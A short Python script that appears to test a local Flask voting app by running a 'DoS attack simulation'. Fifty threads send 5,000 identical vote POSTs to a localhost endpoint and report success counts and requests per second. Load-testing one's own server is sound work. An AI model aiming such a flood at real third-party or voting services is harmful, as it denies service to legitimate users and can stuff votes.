import requests
import threading
import time

# Target URL (Assuming Flask server is running on localhost:5000)
TARGET_URL = "http://127.0.0.1:5000/voting/vote"

# Sample payload to simulate voting
PAYLOAD = {
    "name": "DoS_Attacker",
    "voter_id": "V999",
    "candidate": "Alice"
}

# Configuration
THREAD_COUNT = 50  # Number of concurrent threads (simulates users)
REQUESTS_PER_THREAD = 100  # Requests per thread

# Shared variables to track success and failure counts
success_count = 0
failure_count = 0
lock = threading.Lock()


def send_vote_requests(thread_id):
    global success_count, failure_count
    for i in range(REQUESTS_PER_THREAD):
        try:
            response = requests.post(TARGET_URL, data=PAYLOAD)
            with lock:
                if response.status_code == 200:
                    success_count += 1
                    print(f"[INFO] Thread-{thread_id}: Request {i+1} Success")
                else:
                    failure_count += 1
                    print(f"[ERROR] Thread-{thread_id}: Request {i+1} Failed with status code {response.status_code}")
        except Exception as e:
            with lock:
                failure_count += 1
                print(f"[ERROR] Thread-{thread_id}: Request {i+1} Exception - {e}")


def main():
    global success_count, failure_count
    print("[INFO] Starting DoS Attack Simulation...")
    threads = []

    # Start time
    start_time = time.time()

    # Launch threads
    for t in range(THREAD_COUNT):
        thread = threading.Thread(target=send_vote_requests, args=(t,))
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    # End time
    end_time = time.time()
    duration = end_time - start_time

    print("\n[INFO] DoS Attack Simulation Completed")
    print(f"Total Requests Sent: {THREAD_COUNT * REQUESTS_PER_THREAD}")
    print(f"Successful Requests: {success_count}")
    print(f"Failed Requests: {failure_count}")
    print(f"Total Duration: {duration:.2f} seconds")
    print(f"Requests Per Second: {((THREAD_COUNT * REQUESTS_PER_THREAD) / duration):.2f}")


if __name__ == "__main__":
    main()
